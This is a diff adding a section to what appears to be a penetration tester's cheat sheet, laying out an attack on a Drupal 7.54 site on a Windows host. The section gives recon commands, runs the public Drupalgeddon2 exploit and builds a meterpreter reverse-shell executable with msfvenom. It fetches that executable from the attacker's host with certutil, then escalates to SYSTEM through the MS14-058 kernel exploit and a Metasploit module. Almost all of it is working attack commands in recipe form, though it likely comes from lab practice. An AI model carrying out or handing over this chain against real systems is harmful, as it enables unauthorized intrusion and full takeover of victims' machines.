@@ -1502,3 +1502,66 @@ use post/windows/gather/enum_shares
 # JAWS - Automatic Local Enumeration - Powershell
 powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename Jaws-Enum.txt
 ----------------------------------------------------------------------------------------------------------------------------------------------
+Drupal Geddon 2 CMS Website Exploitation
+----------------------------------------------------------------------------------------------------------------------------------------------
+### Recon Phase
+
+1. Information Gathering:
+`nmap -Pn -sV -F <ip_address>`
+
+2. Version Discovery:
+burpsuite : Repeater --> Response --> X-Generator
+3. Directory Enumeration:
+`gobuster dir --url http://<ip_address> --wordlist /usr/share/seclists/Discovery/Web-content/CMS/Drupal.txt`
+
+-> Changelog.txt to get the specific version
+
+4. Changelog file:
+        -> Drupal 7.54, 2017-02-01 ( Newest to oldest )
+5.  Exploit Identification:
+`git clone https://github.com/dreadlocked/Drupalgeddon2`
+`./drupalgeddon2.rb http://<ip_address>
+drupalgeddon2>> whoami
+
+drupalgeddon2>> systeminfo
+
+drupalgeddon2>> cd C:\\
+
+6. Reverse Shell : 
+kali@kali > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= <attacker> LPORT= <PORT> -f exe > rev.exe
+kali@kali > sudo python3 -m http.server 80
+7. drupalgeddon2>> certutil -urlcache -f http://<attacker>/rev.exe rev.exe
+8. 
+kali@kali > msfconsole
+kali@kali > use multi/handler
+9. Execute rev.exe
+drupalgeddon2>> .\rev.exe
+10. Privilege Escalation 
+meterpreter> sysinfo
+meterpreter> getuid
+meterpreter> getprivs
+-> impersonatePrivilege
+meterpreter> load incongnito
+meterpreter> list_tokens -u
+meterpreter> getsystem
+--> fail -> it is a kernel exploit !! 
+meterpreter> ps
+-> no interesting exe to migrate to!!
+`https://github.com/SecWiki/windows-kernel-exploits`
+`MS14-058`
+
+11.
+kali@kali > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= <attacker> LPORT= <PORT> -f exe > esc.exe
+meterpreter> mkdir Temp
+meterpreter> cd Temp\\
+meterpreter> upload ~/Downloads/MS14-058.exe
+meterpreter> upload esc.exe
+// set up a handler
+meterpreter> shell
+C:\Temp > .\MS14-058.exe esc.exe
+--> if it hangs background the session and then ( ex: session 3 ), you need to use the metasploit module for it.
+use exploit/windows/local/ms14_058_track_popup_menu
+set SESSION 3
+
+
+
